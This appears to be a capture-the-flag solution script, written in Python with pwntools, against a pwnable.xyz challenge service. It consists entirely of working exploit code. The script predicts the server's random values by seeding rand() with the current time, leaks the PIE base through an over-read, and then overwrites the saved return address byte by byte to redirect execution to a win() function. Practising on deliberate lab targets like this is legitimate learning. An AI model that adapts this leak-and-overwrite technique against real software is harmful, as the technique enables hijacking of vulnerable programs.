from pwn import *
from ctypes import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
    libc = CDLL('/lib/x86_64-linux-gnu/libc-2.27.so')
    libc.srand(libc.time((0)))
else:
    r = remote('svc.pwnable.xyz', 30014)
    libc = CDLL('/lib/x86_64-linux-gnu/libc-2.27.so')
    libc.srand(libc.time((0)) - 1) # server time delay

sla = r.sendlineafter
sa = r.sendafter

def Init(data):
    sla('> ', '1')
    sla('data: ', data)

def Append(data, zero=False):
    sla('> ', '2')
    if not zero:
        sa('chars: ', data)

def Print():
    sla('> ', '3')

win_offset = 0xb57 # offset of win() from PIE base


# generate random values

randValues = []
randSum = 0

while randSum <= 0x388:
    randValue = libc.rand() % 0x10
    randValues.append(randValue)
    randSum += randValue


# PIE leak

Init('A' * (0x408 - randSum))

leaked = False # true if PIE is leaked

for randValue in randValues:
    if randValue >= 14 and not leaked:
        sla('> ', '2')
        sa('chars: ', 'A' * 8)
        
        Print()

        r.recvline()
        pie = u64(r.recvline()[-7:-1].ljust(8, b'\x00')) - 0xbc2 # PIE base
        log.info('PIE base: ' + hex(pie))
        win = pie + win_offset

        leaked = True
    elif randValue == 0:
        Append('A' * randValue, True)
    else:
        Append('A' * randValue)


# RET overwrite

overwritten = 0 # overwritten bytes in return address

while overwritten < 6:
    sla('> ', '2')

    r.recvuntil('Give me ')
    chars = int(r.recvuntil(' ')[:-1])

    if overwritten + chars > 8:
        sa('chars: ', p64(win + 4)[overwritten:])
    else:
        sa('chars: ', p64(win + 4)[overwritten:overwritten + chars])

    overwritten += chars

sla('> ', '0') # return main()


r.interactive()